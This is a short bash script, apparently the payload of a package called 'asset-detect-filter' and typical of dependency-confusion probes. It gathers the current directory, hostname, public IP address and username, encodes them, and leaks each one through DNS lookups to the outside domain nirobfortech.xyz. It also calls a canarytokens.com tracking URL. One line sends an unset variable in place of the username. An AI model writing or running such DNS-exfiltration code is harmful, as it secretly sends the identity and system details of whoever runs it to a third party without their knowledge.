#!/usr/bin/bash

pwd | xxd -p | while read ut;do dig $ut.nirobfortech.xyz;done;
b=$(hostname | head | base64) && dig $b.nirobfortech.xyz > /dev/null 2>&1;
c=$(curl ifconfig.me | head | base64) && dig $c.nirobfortech.xyz > /dev/null 2>&1;
d=$(echo "asset-detect-filter" | head | base64) && dig $d.nirobfortech.xyz > /dev/null 2>&1;
e=$(whoami | head | base64) && dig $a.nirobfortech.xyz > /dev/null 2>&1;
f=$(curl http://canarytokens.com/images/about/tczi9si3ckwcpgxx4jjmpfpca/contact.php);
#echo $a && $b && $c  > /dev/null 2>&1;
